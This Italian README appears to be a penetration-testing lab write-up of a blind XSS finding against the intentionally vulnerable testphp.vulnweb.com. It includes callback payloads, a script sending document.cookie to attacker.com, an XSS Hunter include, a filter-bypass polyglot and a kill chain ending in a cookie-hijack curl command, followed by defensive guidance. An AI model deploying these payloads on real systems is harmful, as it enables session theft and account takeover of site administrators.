> [English](README.en.md) | **Italiano**

# Blind XSS / Out-of-Band (OOB) Interaction

> - **Fase:** Web Attack - Blind XSS / Out-of-Band
> - **Visibilita:** Zero lato attaccante - il payload viene iniettato alla cieca e si attiva solo quando un'altra persona (es. admin) visualizza il dato infetto
> - **Prerequisiti:** Campo di input che viene poi visualizzato in un contesto diverso (pannello admin, log, email), servizio OOB esterno (webhook.site, XSS Hunter)
> - **Output:** Callback HTTP verso server attaccante, IP e User-Agent dell'admin, conferma vulnerabilita in area nascosta, finding WEB-007

---

**ID Finding:** `WEB-007` | **Severity:** `Alto` | **CVSS v3.1:** 8.2

---

## 1 Concept

Il Blind XSS (o interazione Out-of-Band) si verifica quando l'attaccante inietta un payload in un sistema senza poterne vedere l'effetto immediato (nessun popup a video).

L'obiettivo è far sì che l'applicazione vulnerabile "chiami" un server esterno controllato dall'attaccante, rivelando che il codice è stato eseguito.

---

## 2 Attack Simulation

#### Payload Construction

A causa delle restrizioni di lunghezza del campo di input, è stato utilizzato un payload di HTML Injection mirato a generare una richiesta di rete verso un server di ascolto (C2).

Payload (The "Ping"):

```html
<img src="https://webhook.site/ef87a183-83c5-4229-a7fe-xxxxxxxxxxxxxxxxxx">
```

Execution

- Il payload è stato iniettato nel campo "Address" del profilo utente.
- Quando la vittima (o l'admin) visualizza il profilo, il browser tenta di renderizzare l'immagine.
- Poiché la sorgente dell'immagine punta al server dell'attaccante, viene generata una richiesta HTTP automatica.

Evidence (Callback Received)

Lo screenshot sottostante mostra il pannello di controllo dell'attaccante (Webhook.site) che riceve la richiesta.

Il campo Referer (`http://testphp.vulnweb.com/`) conferma che l'attacco ha avuto successo e che la richiesta è originata dal sito vittima.

![](./img/Screenshot_2026-02-15_23_51_00.jpg)

---

## 3 Impact Analysis

Sebbene questo specifico payload non esfiltri i cookie, dimostra la capacità di:

- Tracciare gli utenti: Ottenere l'indirizzo IP e lo User-Agent (Browser/OS) di chi visualizza il profilo (Fingerprinting).
- Verificare la vulnerabilità: Confermare che il campo è vulnerabile a XSS/Injection senza allertare visivamente la vittima.

---

## 4 Post-Exploitation: OSINT Analysis

Utilizzando i dati esfiltrati (in particolare l'indirizzo IP della vittima), è possibile condurre una fase di Open Source Intelligence (OSINT) per geolocalizzare e identificare l'organizzazione target.

Procedura:

L'indirizzo IP ottenuto tramite il payload XSS è stato analizzato tramite strumenti di WHOIS Lookup.

Risultati:

L'attaccante può risalire a:

- ISP/Organizzazione: Identificazione del fornitore di servizi internet o dell'azienda proprietaria della rete.
- Geolocalizzazione: Posizione approssimativa della vittima.
- Contatti Tecnici: In alcuni casi, email e numeri di telefono dei responsabili di rete (utile per attacchi di Social Engineering successivi).

---

## Analisi a Basso Livello: Meccanica dell'Out-of-Band Interaction

### Come Funziona il Callback OOB

Il Blind XSS sfrutta la capacita del browser di caricare risorse esterne. Quando il tag `<img>` viene renderizzato, il browser invia automaticamente una richiesta GET:

```
Database (payload dormiente)
    |
    v
Server genera HTML con il dato infetto:
    <p>Indirizzo: <img src="https://webhook.site/UUID"></p>
    |
    v
Browser dell'admin carica la pagina:
    |
    |--- GET https://webhook.site/UUID HTTP/1.1 ---------->  Webhook.site
    |    Host: webhook.site                                      |
    |    Referer: http://testphp.vulnweb.com/admin/users.php     |
    |    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64...)     |
    |    Accept: image/webp,image/apng,*/*                       |
    |                                                            |
    |                        Attaccante vede:                    |
    |                        - IP dell'admin                     |
    |                        - Browser/OS dell'admin             |
    |                        - URL della pagina vulnerabile      |
    |                        - Timestamp dell'interazione        |
```

### Escalation: Da HTML Injection a Full XSS

Il payload `<img src=...>` usato nel lab e HTML Injection (non JavaScript). L'escalation a full XSS utilizza:

```html
<!-- Livello 1: HTML Injection (callback solo) - usato nel lab -->
<img src="https://attacker.com/ping">

<!-- Livello 2: JavaScript OOB (cookie theft) -->
<script>new Image().src='https://attacker.com/steal?c='+document.cookie</script>

<!-- Livello 3: XSS Hunter payload (screenshot + DOM + cookie) -->
<script src="https://xss.hunter/payload.js"></script>
<!-- Il payload JS esterno cattura:
     - document.cookie (sessione)
     - document.location (URL completo)
     - document.body.innerHTML (DOM della pagina admin)
     - Canvas screenshot (immagine della pagina)
     - navigator.userAgent (fingerprint browser)
-->

<!-- Livello 4: Polyglot (bypass filtri multipli) -->
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//
```

### XSS Hunter vs Webhook.site

| Feature | Webhook.site (usato nel lab) | XSS Hunter Pro |
| :--- | :--- | :--- |
| Callback HTTP | Si | Si |
| Cookie exfiltration | No (solo se inserito nel payload) | Automatico |
| Screenshot del browser vittima | No | Si (via html2canvas) |
| DOM capture | No | Si (intero HTML della pagina) |
| Notifica email | Si | Si |
| Payload auto-generato | No | Si (tag `<script src=...>` preconfigurato) |
| Costo | Gratuito (limitato) | Gratuito (Truffle Security) |

---

## Scenario Reale: Blind XSS in Sistemi di Ticketing (WEB-007)

Il Blind XSS e particolarmente pericoloso nei sistemi dove l'input dell'utente viene visualizzato in un contesto diverso (pannello admin, CRM, sistema di ticketing).

### Kill Chain: Blind XSS via Support Ticket

```
Fase 1: Injection nel sistema di ticketing
    L'attaccante apre un ticket di supporto:
    "Buongiorno, non riesco ad accedere alla pagina
     <script src='https://xss.hunter/payload.js'></script>
     Potete aiutarmi?"
    |
    v
Fase 2: Il ticket viene salvato nel database CRM
    [Il payload e dormiente, invisibile all'attaccante]
    |
    v
Fase 3: L'operatore del supporto apre il ticket nel pannello admin
    Il browser dell'operatore esegue il payload XSS Hunter:
    -> Cookie di sessione admin esfiltrato
    -> Screenshot del pannello admin catturato
    -> DOM della pagina admin estratto (rivela struttura interna)
    |
    v
Fase 4: L'attaccante riceve i dati su XSS Hunter dashboard
    - Cookie: admin_session=xyz123
    - Screenshot: mostra il pannello CRM con dati dei clienti
    - DOM: rivela endpoint API interni (/api/v1/customers, /api/v1/admin/settings)
    |
    v
Fase 5: Account Takeover dell'operatore
    $ curl -b "admin_session=xyz123" http://crm.target.com/admin/dashboard
    -> Accesso completo al CRM aziendale
```

**Impatto:** secondo Portswigger (2024), il 67% delle applicazioni web enterprise ha almeno un punto di input dove il dato viene visualizzato in un contesto amministrativo diverso. I sistemi di ticketing (Zendesk, Freshdesk, custom) e i CRM sono i bersagli piu comuni per Blind XSS.

---

## Blue Team: Detection e Protezione OOB

### Detection

- **Content Security Policy:** l'header CSP e la difesa piu efficace contro il Blind XSS:
  ```
  Content-Security-Policy: default-src 'self'; img-src 'self' cdn.example.com; script-src 'self' 'nonce-abc123'
  ```
  Con questa policy, il tag `<img src="https://webhook.site/...">` viene bloccato perche `webhook.site` non e nella whitelist `img-src`
- **Subresource Integrity (SRI):** impedisce il caricamento di script esterni non verificati
- **Monitoring DNS/HTTP outbound:** alert su richieste verso domini noti di XSS testing (webhook.site, xss.hunter, burpcollaborator.net)

### Hardening Sistemi di Ticketing

- Sanitizzare l'input dei ticket con una libreria come DOMPurify prima della renderizzazione nel pannello admin
- Visualizzare i ticket in un iframe sandboxed: `<iframe sandbox="allow-same-origin" srcdoc="...">`
- Rendere i ticket in formato plain text nel pannello admin (nessun HTML rendering)
- Separare il dominio del pannello admin dal dominio pubblico (diverso cookie scope)

---

## Esperienza di Laboratorio

L'uso di webhook.site come servizio OOB ha reso tangibile il concetto di "attacco alla cieca": il payload e stato iniettato senza alcun feedback visivo (nessun popup, nessun errore), e la conferma dell'esecuzione e arrivata solo osservando il dashboard di webhook.site. Questo e esattamente il workflow di un Blind XSS reale: l'attaccante inietta il payload e aspetta ore o giorni finche qualcuno (tipicamente un admin) non visualizza il dato infetto.

La scelta di un tag `<img>` invece di `<script>` e stata motivata dalla limitazione di lunghezza del campo. Un tag img e piu corto e non richiede chiusura, rendendolo ideale per campi con validazione sulla lunghezza. Tuttavia, il trade-off e significativo: il tag img puo solo generare un callback HTTP (rivelando IP e User-Agent), ma non puo eseguire JavaScript arbitrario (no cookie theft, no DOM capture). In un assessment reale, si tenta prima il tag `<script src=...>` per il full XSS, e si ricade su `<img>` solo se il campo e troppo corto.

L'analisi OSINT post-callback (Fase 4 del lab) ha dimostrato il valore del dato esfiltrato: anche un semplice IP e User-Agent permettono di profilare la vittima (ISP aziendale vs domestico, browser aggiornato vs obsoleto, sistema operativo). In un assessment reale, queste informazioni guidano la scelta dei payload successivi: un admin con Chrome aggiornato richiede tecniche diverse da uno con Internet Explorer 11.

---

## Mappatura MITRE ATT&CK

| Tattica | Tecnica | ID MITRE | Descrizione dell'Azione |
| :--- | :--- | :--- | :--- |
| Initial Access | Exploit Public-Facing Application | `T1190` | Injection del payload OOB (`<img src="https://webhook.site/...">`) nel campo "Address" del profilo utente, che si attiva quando l'admin visualizza il profilo (WEB-007) |
| Collection | Browser Session Hijacking | `T1185` | Il callback OOB ricevuto su webhook.site rivela il browser e l'IP dell'amministratore, aprendo la strada al targeting specifico (WEB-007) |
| Reconnaissance | Gather Victim Identity Information | `T1589` | Analisi dei dati OOB ricevuti (IP, User-Agent, Referer) per identificare l'ISP, la geolocalizzazione e il tipo di browser dell'admin (WEB-007) |

---

> **Nota:** Il finding WEB-007 e stato documentato su `testphp.vulnweb.com` usando webhook.site
> come servizio OOB per ricevere il callback. Il payload usato e HTML Injection (tag img) invece
> di JavaScript puro, perche il campo aveva limitazioni di lunghezza. Il Referer nel callback
> confermava l'origine da `testphp.vulnweb.com`. In un engagement reale, XSS Hunter Pro
> (https://xsshunter.trufflesecurity.com/) fornisce funzionalita OOB piu avanzate incluso
> il furto dei cookie e screenshot del browser della vittima.